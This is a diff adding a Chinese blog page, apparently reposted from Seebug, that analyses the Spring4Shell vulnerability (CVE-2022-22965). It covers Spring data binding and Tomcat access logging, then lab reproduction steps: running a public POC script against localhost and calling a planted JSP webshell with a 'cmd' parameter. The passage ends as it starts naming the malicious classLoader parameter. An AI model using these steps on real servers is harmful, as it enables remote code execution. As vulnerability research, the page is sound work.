@@ -1,0 +1,483 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Spring4Shell漏洞(CVE-2022-22965)原理分析 | Antel0p3&#39;s blog</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="原文：https://paper.seebug.org/1877/#312-suffix
+
+一、前置知识1.1 SpringMVC参数绑定为了方便编程，SpringMVC支持将HTTP请求中的的请求参数或者请求体内容，根据Controller方法的参数，自动完成类型转换和赋值。之后，Controll">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Spring4Shell漏洞(CVE-2022-22965)原理分析"/>
+  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+					
+							<div class="page-header">
+								<h1>
+									
+											
+												Spring4Shell漏洞(CVE-2022-22965)原理分析
+									
+									
+								</h1>
+								
+									<p id="/2024/01/19/Spring4Shell%E6%BC%8F%E6%B4%9E/" class="leancloud-visitors view"
+										data-flag-title="Spring4Shell漏洞(CVE-2022-22965)原理分析">
+										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+									</p>
+									
+							</div>
+							
+								
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta">
+		
+	</div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <blockquote>
+<p>原文：<a target="_blank" rel="noopener" href="https://paper.seebug.org/1877/#312-suffix">https://paper.seebug.org/1877/#312-suffix</a></p>
+</blockquote>
+<h2 id="一、前置知识"><a href="#一、前置知识" class="headerlink" title="一、前置知识"></a>一、前置知识</h2><h3 id="1-1-SpringMVC参数绑定"><a href="#1-1-SpringMVC参数绑定" class="headerlink" title="1.1 SpringMVC参数绑定"></a>1.1 SpringMVC参数绑定</h3><p>为了方便编程，SpringMVC支持将HTTP请求中的的请求参数或者请求体内容，根据<code>Controller</code>方法的参数，自动完成类型转换和赋值。之后，<code>Controller</code>方法就可以直接使用这些参数，避免了需要编写大量的代码从<code>HttpServletRequest</code>中获取请求数据以及类型转换。下面是一个简单的示例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/addUser&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> String <span class="title function_">addUser</span><span class="params">(User user)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Department department;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Department <span class="title function_">getDepartment</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> department;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDepartment</span><span class="params">(Department department)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.department = department;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Department</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当请求为<code>/addUser?name=test&amp;department.name=SEC</code>时，<code>public String addUser(User user)</code>中的<code>user</code>参数内容如下：</p>
+<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228872000-1dtaqx.png-w331s" alt="image"></p>
+<p>可以看到，<code>name</code>自动绑定到了<code>user</code>参数的<code>name</code>属性上，<code>department.name</code>自动绑定到了<code>user</code>参数的<code>department</code>属性的<code>name</code>属性上。</p>
+<p>注意<code>department.name</code>这项的绑定，表明SpringMVC支持多层嵌套的参数绑定。实际上<code>department.name</code>的绑定是Spring通过如下的调用链实现的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User.getDepartment()</span><br><span class="line">    Department.setName()</span><br></pre></td></tr></table></figure>
+
+<p>假设请求参数名为<code>foo.bar.baz.qux</code>，对应<code>Controller</code>方法入参为<code>Param</code>，则有以下的调用链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Param.getFoo()</span><br><span class="line">    Foo.getBar()</span><br><span class="line">        Bar.getBaz()</span><br><span class="line">            Baz.setQux() <span class="comment">// 注意这里为set</span></span><br></pre></td></tr></table></figure>
+
+<p>SpringMVC实现参数绑定的主要类和方法是<code>WebDataBinder.doBind(MutablePropertyValues)</code>。</p>
+<h3 id="1-2-Java-Bean-PropertyDescriptor"><a href="#1-2-Java-Bean-PropertyDescriptor" class="headerlink" title="1.2 Java Bean PropertyDescriptor"></a>1.2 Java Bean <code>PropertyDescriptor</code></h3><p><code>PropertyDescriptor</code>是JDK自带的<code>java.beans</code>包下的类，意为属性描述器，用于获取符合Java Bean规范的对象属性和get&#x2F;set方法。下面是一个简单的例子：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.BeanInfo;</span><br><span class="line"><span class="keyword">import</span> java.beans.Introspector;</span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyDescriptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PropertyDescriptorDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanInfo</span> <span class="variable">userBeanInfo</span> <span class="operator">=</span> Introspector.getBeanInfo(User.class);</span><br><span class="line">        PropertyDescriptor[] descriptors = userBeanInfo.getPropertyDescriptors();</span><br><span class="line">        <span class="type">PropertyDescriptor</span> <span class="variable">userNameDescriptor</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (PropertyDescriptor descriptor : descriptors) &#123;</span><br><span class="line">            <span class="keyword">if</span> (descriptor.getName().equals(<span class="string">&quot;name&quot;</span>)) &#123;</span><br><span class="line">                userNameDescriptor = descriptor;</span><br><span class="line">                System.out.println(<span class="string">&quot;userNameDescriptor: &quot;</span> + userNameDescriptor);</span><br><span class="line">                System.out.println(<span class="string">&quot;Before modification: &quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;user.name: &quot;</span> + userNameDescriptor.getReadMethod().invoke(user));</span><br><span class="line">                userNameDescriptor.getWriteMethod().invoke(user, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;After modification: &quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;user.name: &quot;</span> + userNameDescriptor.getReadMethod().invoke(user));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">userNameDescriptor: java.beans.PropertyDescriptor[name=name; values=&#123;expert=<span class="literal">false</span>; visualUpdate=<span class="literal">false</span>; hidden=<span class="literal">false</span>; enumerationValues=[Ljava.lang.Object;@5cb9f472; required=<span class="literal">false</span>&#125;; propertyType=<span class="keyword">class</span> <span class="title class_">java</span>.lang.String; readMethod=<span class="keyword">public</span> java.lang.String cn.jidun.User.getName(); writeMethod=<span class="keyword">public</span> <span class="keyword">void</span> cn.jidun.User.setName(java.lang.String)]</span><br><span class="line">Before modification: </span><br><span class="line">user.name: foo</span><br><span class="line">After modification: </span><br><span class="line">user.name: bar</span><br></pre></td></tr></table></figure>
+
+<p>从上述代码和输出结果可以看到，<code>PropertyDescriptor</code>实际上就是Java Bean的属性和对应get&#x2F;set方法的集合。</p>
+<h3 id="1-3-Spring-BeanWrapperImpl"><a href="#1-3-Spring-BeanWrapperImpl" class="headerlink" title="1.3 Spring BeanWrapperImpl"></a>1.3 Spring <code>BeanWrapperImpl</code></h3><p>在Spring中，<code>BeanWrapper</code>接口是对Bean的包装，定义了大量可以非常方便的方法对Bean的属性进行访问和设置。</p>
+<p><code>BeanWrapperImpl</code>类是<code>BeanWrapper</code>接口的默认实现，<code>BeanWrapperImpl.wrappedObject</code>属性即为被包装的Bean对象，<code>BeanWrapperImpl</code>对Bean的属性访问和设置最终调用的是<code>PropertyDescriptor</code>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanWrapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanWrapperImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanWrapperDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="type">Department</span> <span class="variable">department</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Department</span>();</span><br><span class="line">        department.setName(<span class="string">&quot;SEC&quot;</span>);</span><br><span class="line">        user.setDepartment(department);</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanWrapper</span> <span class="variable">userBeanWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanWrapperImpl</span>(user);</span><br><span class="line">        userBeanWrapper.setAutoGrowNestedPaths(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;userBeanWrapper: &quot;</span> + userBeanWrapper);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Before modification: &quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;user.name: &quot;</span> + userBeanWrapper.getPropertyValue(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;user.department.name: &quot;</span> + userBeanWrapper.getPropertyValue(<span class="string">&quot;department.name&quot;</span>));</span><br><span class="line"></span><br><span class="line">        userBeanWrapper.setPropertyValue(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line">        userBeanWrapper.setPropertyValue(<span class="string">&quot;department.name&quot;</span>, <span class="string">&quot;IT&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;After modification: &quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;user.name: &quot;</span> + userBeanWrapper.getPropertyValue(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;user.department.name: &quot;</span> + userBeanWrapper.getPropertyValue(<span class="string">&quot;department.name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">userBeanWrapper: org.springframework.beans.BeanWrapperImpl: wrapping object [cn.jidun.User@1d371b2d]</span><br><span class="line">Before modification: </span><br><span class="line">user.name: foo</span><br><span class="line">user.department.name: SEC</span><br><span class="line">After modification: </span><br><span class="line">user.name: bar</span><br><span class="line">user.department.name: IT</span><br></pre></td></tr></table></figure>
+
+<p>从上述代码和输出结果可以看到，通过<code>BeanWrapperImpl</code>可以很方便地访问和设置Bean的属性，比直接使用<code>PropertyDescriptor</code>要简单很多。</p>
+<h3 id="1-4-Tomcat-AccessLogValve-和-access-log"><a href="#1-4-Tomcat-AccessLogValve-和-access-log" class="headerlink" title="1.4 Tomcat AccessLogValve 和 access_log"></a>1.4 Tomcat <code>AccessLogValve</code> 和 <code>access_log</code></h3><p>Tomcat的<code>Valve</code>用于处理请求和响应，通过组合了多个<code>Valve</code>的<code>Pipeline</code>，来实现按次序对请求和响应进行一系列的处理。其中<code>AccessLogValve</code>用来记录访问日志access_log。Tomcat的<code>server.xml</code>中默认配置了<code>AccessLogValve</code>，所有部署在Tomcat中的Web应用均会执行该<code>Valve</code>，内容如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span> <span class="attr">directory</span>=<span class="string">&quot;logs&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">prefix</span>=<span class="string">&quot;localhost_access_log&quot;</span> <span class="attr">suffix</span>=<span class="string">&quot;.txt&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">pattern</span>=<span class="string">&quot;%h %l %u %t <span class="symbol">&amp;quot;</span>%r<span class="symbol">&amp;quot;</span> %s %b&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>下面列出配置中出现的几个重要属性： - directory：access_log文件输出目录。 - prefix：access_log文件名前缀。 - pattern：access_log文件内容格式。 - suffix：access_log文件名后缀。 - fileDateFormat：access_log文件名日期后缀，默认为<code>.yyyy-MM-dd</code>。</p>
+<h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="2-1-复现环境"><a href="#2-1-复现环境" class="headerlink" title="2.1 复现环境"></a>2.1 复现环境</h3><ul>
+<li>操作系统：Ubuntu 18</li>
+<li>JDK：11.0.14</li>
+<li>Tomcat：9.0.60</li>
+<li>SpringBoot：2.6.3</li>
+</ul>
+<h3 id="2-2-复现过程"><a href="#2-2-复现过程" class="headerlink" title="2.2 复现过程"></a>2.2 复现过程</h3><ol>
+<li>创建一个maven项目，pom.xml内容如下：</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>CVE-2022-22965<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>项目中添加如下代码，作为SpringBoot的启动类：</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.builder.SpringApplicationBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.support.SpringBootServletInitializer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApplicationMain</span> <span class="keyword">extends</span> <span class="title class_">SpringBootServletInitializer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> SpringApplicationBuilder <span class="title function_">configure</span><span class="params">(SpringApplicationBuilder builder)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> builder.sources(ApplicationMain.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(ApplicationMain.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>将章节<code>1.1 SpringMVC参数绑定</code>中的<code>User</code>类和<code>UserController</code>类添加到项目中。</li>
+<li>执行maven打包命令，将项目打包为war包，命令如下：</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>将项目中target目录里打包生成的<code>CVE-2022-22965-0.0.1-SNAPSHOT.war</code>，复制到Tomcat的<code>webapps</code>目录下，并启动Tomcat。</li>
+<li>从 <a target="_blank" rel="noopener" href="https://github.com/BobTheShoplifter/Spring4Shell-POC/blob/0c557e85ba903c7ad6f50c0306f6c8271736c35e/poc.py">https://github.com/BobTheShoplifter/Spring4Shell-POC/blob/0c557e85ba903c7ad6f50c0306f6c8271736c35e/poc.py</a> 下载POC文件，执行如下命令：</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 poc.py --url http://localhost:8080/CVE-2022-22965-0.0.1-SNAPSHOT/addUser</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>浏览器中访问<code>http://localhost:8080/tomcatwar.jsp?pwd=j&amp;cmd=gnome-calculator</code>，复现漏洞。</li>
+</ol>
+<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228873000-2gyffg.png-w331s" alt="image"></p>
+<h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="3-1-POC分析"><a href="#3-1-POC分析" class="headerlink" title="3.1 POC分析"></a>3.1 POC分析</h3><p>我们从POC入手进行分析。通过对POC中的<code>data</code> URL解码后可以拆分成如下5对参数。</p>
+<h4 id="3-1-1-pattern参数"><a href="#3-1-1-pattern参数" class="headerlink" title="3.1.1 pattern参数"></a>3.1.1 <code>pattern</code>参数</h4><ul>
+<li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.pattern</code></li>
